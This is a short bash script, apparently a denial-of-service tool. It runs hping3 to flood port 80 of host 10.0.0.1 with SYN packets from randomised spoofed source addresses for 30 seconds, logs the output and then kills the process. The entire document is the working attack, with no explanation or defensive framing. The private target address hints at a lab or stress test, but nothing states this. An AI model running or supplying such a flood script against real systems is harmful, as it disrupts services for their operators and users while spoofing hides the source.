#!/bin/bash
hping3 -p 80 -S --flood 10.0.0.1 --rand-source > log.txt &
sleep 30
pkill hping3